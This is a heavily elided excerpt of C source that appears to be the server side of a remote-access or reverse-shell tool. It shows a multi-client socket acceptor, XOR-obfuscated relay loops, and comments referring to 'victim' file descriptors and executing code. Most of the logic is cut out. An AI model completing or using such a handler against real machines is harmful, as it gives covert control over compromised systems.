        ...
        if (strcmp(buffer, "help\n") == 0 || strcmp(buffer, "help\n\n") == 0) {
            ...
            for (int c = 4; c < strlen(buffer); c++) {
                if (isdigit(buffer[c])) {
                    selected_id +=
                        ((int)buffer[c] - 48) *
                        (strlen(buffer) - 5); // TODO FIX THIS MESS PLEASE
                }
            }
            ...
            printf("Unknown command. Enter 'help' for list of available "
                   "commands.\n");
        }
        printf(PROMPT);
        fflush(NULL);
...
Socket_Reader()
{
    ...
    while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
        ...
        if (write(STDOUT_FILENO, xorbuffer, n) <
            0) // writes data from victim fd to stdout
...
Socket_Writer()
{
    ...
    while (
        a.kill == 0 &&
        (n = read(a.src, buffer, MAXBUF)) >
            0) // reads from the stdin file descriptor and executes code if it's
...
Acceptor()
{
    ...
    for (i = 0; i < max_clients;
         i++) // sets array of socket fds to zero so not read
        client_socket[i] = 0;
        ...
        if (FD_ISSET(master_socket, &readfds)) {
            ...
            if (FD_ISSET(master_socket, &readfds)) {
                if ((new_socket = accept(
                         master_socket, (struct sockaddr*)&cli, &len)) < 0) {
                    perror("accept");
                    exit(EXIT_FAILURE);
                }
